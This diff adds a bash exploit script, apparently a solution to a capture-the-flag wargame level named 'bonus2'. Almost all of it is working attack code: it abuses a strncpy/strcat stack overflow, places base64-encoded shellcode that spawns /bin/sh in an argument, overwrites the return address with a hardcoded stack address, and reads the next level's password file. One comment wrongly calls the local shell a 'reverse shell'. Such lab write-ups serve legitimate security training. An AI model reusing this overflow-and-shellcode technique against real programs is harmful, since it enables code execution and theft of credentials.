@@ -1,0 +1,43 @@
+# Helper function, "put n s" print the string 's' n times
+put() { printf "$2%.0s" $(seq 1 "$1"); }
+
+# Helper function, "hex 41424344" gives "ABCD"
+hex() { echo "$1" | xxd -p -r; }
+
+# Helper function, "hex_little_endian 41424344" gives "DBCA"
+hex_little_endian() { hex $(printf "$1" | rev | fold -b2 | rev | tr -d '\n') ; }
+
+# Helper function, "compute '16 - 4'" gives "12"
+compute() { echo "$1" | bc | tr -d '\n' ; }
+
+# We use strncpy vulnerability to have a non-null terminated 'user.firstname' of 40 bytes
+# When '(user.firstname + user.surname)' will be use in the 'strcat' of 'greetuser', written 32 more bytes than expected
+# We can use this as a stack overflow to override the return address of 'greetuser'
+# We have to change to lang to "nl" to reach the return address 
+# We jmp to our shellcode written in the first argument, and cat the file
+
+# Shellcode without '\n' or '\0' that executes 'execve("/bin//sh", NULL, NULL)'
+SHELLCODE_BASE64="McBQBAtoLy9zaGgvYmluieMxyTHSzYA="
+SHELLCODE="$(echo ${SHELLCODE_BASE64} | base64 --decode)"
+SHELLCODE_SIZE=$(printf "${SHELLCODE}" | wc -c)
+
+# We set 'argv[1]' to our shellcode and fill it to reach 40 bytes
+SHELLCODE_ADDRESS="bffff670"
+ARG1_SIZE=40
+ARG1_FILLER_SIZE="$(compute "${ARG1_SIZE} - ${SHELLCODE_SIZE}")"
+ARG1_FILLER="$(put "${ARG1_FILLER_SIZE}" "A")"
+ARG1="${SHELLCODE}${ARG1_FILLER}"
+
+# We 'argv[2]' to some filler values and the address to our shellcode
+GOEDEMIDDAG_SIZE=13
+GREETUSER_RETURN_ADDRESS_OFFSET=76
+GREETUSER_RETURN_ADDRESS_REPLACEMENT="$(hex_little_endian "${SHELLCODE_ADDRESS}")"
+ARG2_FILLER_SIZE="$(compute "${GREETUSER_RETURN_ADDRESS_OFFSET} - ${GOEDEMIDDAG_SIZE} - ${ARG1_SIZE}")"
+ARG2_FILLER="$(put "${ARG2_FILLER_SIZE}" "A")"
+ARG2="${ARG2_FILLER}${GREETUSER_RETURN_ADDRESS_REPLACEMENT}"
+
+# We run our exploit
+LANG="nl" ./bonus2 "${ARG1}" "${ARG2}"
+
+# We use the reverse shell to retrieve the password
+$ cat /home/user/bonus3/.pass
